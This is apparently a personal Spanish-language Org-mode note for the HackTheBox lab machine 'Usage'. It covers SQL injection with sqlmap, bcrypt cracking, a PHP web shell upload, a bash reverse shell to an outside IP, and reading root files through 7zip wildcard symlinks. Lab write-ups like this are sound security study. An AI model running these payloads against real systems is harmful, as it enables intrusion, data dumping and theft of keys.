@@ -1,0 +1,112 @@
+:PROPERTIES:
+:ID:       a8970387-aaf9-4e58-af95-e40aa5360331
+:END:
+#+title: Usage
+
+* Enumeración
+Empezar con los puertos:
+#+begin_src bash
+sudo nmap -sC -sV -vv -oA nmap/usage 10.10.11.18
+#+end_src
+Puertos abiertos: 22 y 80 (ubuntu).
+
+Hay un login, probar si da información el error, interceptar request con Burpsuite.
+Se puede probar registrar un usuario, dice que envió un mail.
+Probar IDOR: poner /1 o /2 en el nombre de los parámetros, por ejemplo /posts/1.
+Enumerar directorios:
+#+begin_src bash
+gobuster dir -u http://usage.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o root.out
+#+end_src
+
+* SQL Injection
+Ir a Reset Password y testear SQLI, agregar una ' para ver si rompe. Con '-- -' no debería romper.
+Mandar esa request con la cookie a repeater y ver qué hace.
+Copiar la request (sin las comillas) a un archivo y usar sqlmap:
+#+begin_src bash
+sqlmap -r reset.req -p email --level 5 --risk 3 --batch --technique=B
+#+end_src
+La técnica es boolean injection, podría no agregarse.
+Enumerar DBs:
+#+begin_src bash
+sqlmap -r reset.req -p email --level 5 --risk 3 --batch --technique=B --dbs
+#+end_src
+Descubrió usage_blog, dumpear:
+#+begin_src bash
+sqlmap -r reset.req -p email --level 5 --risk 3 --batch --technique=B --dump usage_blog
+#+end_src
+De la tabla users extraer la información a otro archivo.
+También se podría extraer directamente la tabla que tiene los admins
+#+begin_src bash
+sqlmap -r reset.req -p email --level 5 --risk 3 --batch --technique=B --dump -T admin_users
+#+end_src
+
+* Crackear hashes
+Para extraer los hashes:
+#+begin_src bash
+cat archivo | awk '{print $8}' > hashes.out
+#+end_src
+#+begin_src bash
+hashcat -m 3200 hashes.out /opt/wordlist/rockyou.txt
+#+end_src
+Bcrypt es 3200 usualmente.
+Descubrimos la password xander para el usuario raj@raj.com pero no funciona para el panel de admin.
+Descubrimos la password whatever1 para el usuario admin y con eso entramos.
+
+* File upload
+Buscar vulnerabilidades para laravel-admin 1.8.18. Podemos encontrar el CVE-2023-24249 pero se trata simplemente de un file upload en PHP sencillo.
+Interceptar la request que carga la imagen con Burpsuite y cambiar el filename a filename="shell.php" y colocar lo siguiente:
+#+begin_src php
+<?php system($_REQUEST['cmd'])?>
+#+end_src
+Ir a: http://admin.usage.htb/uploads/shell.php?cmd=id.
+Es preferible hacerlo por POST porque hay menos caracteres prohibidos.
+Se puede poner en el body
+#+begin_src bash
+cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
+#+end_src
+Usar URL encoding.
+Atrapar la reverse shell con:
+#+begin_src bash
+nc -lvnp 9001
+#+end_src
+También se puede usar pwncat u otra herramienta similar.
+Conseguimos así la shell en el servidor.
+
+* Escalamiento de privilegios
+Primero conviene estabilizar la shell:
+#+begin_src bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Salir con CTRL Z
+stty raw -echo;fg
+#+end_src
+Buscar MySQL passwords en config/database.php. Son todos defaults aparentemente.
+Buscar en .env. Están las credenciales para el usuario staff de la base de datos.
+#+begin_src bash
+mysql -u staff -p
+# Pegar la contraseña
+#+end_src
+No hay mucho. Existe un .monitrc donde hay un allow admin y una contraseña.
+Probamos con otros usuarios como xander:
+#+begin_src bash
+su - xander
+# Pegar la contraseña que extrajimos de la base de datos
+#+end_src
+Chequeamos los privilegios que tiene este usuario:
+#+begin_src bash
+sudo -l
+#+end_src
+Nos muestra que puede usar /usr/bin/usage_management.
+Si lo ejecutamos nos da varias opciones pero sólo permite hacer backups.
+#+begin_src bash
+strings usage_management
+#+end_src
+No se ve mucho. Salvo porque está usando 7zip con un *.
+#+begin_src bash
+touch -- @root.txt
+touch -- @id_rsa
+ln -s /root/root.txt root.txt
+ln -s /root/.ssh/id_rsa id_rsa
+mv * /var/www/html/
+#+end_src
+Ahora cuando el 7z corra va a ir a root.txt y lo va a leer.
+Ejecutamos el script y nos va a mostrar el archivo root.txt en MD5 y la key de ssh.
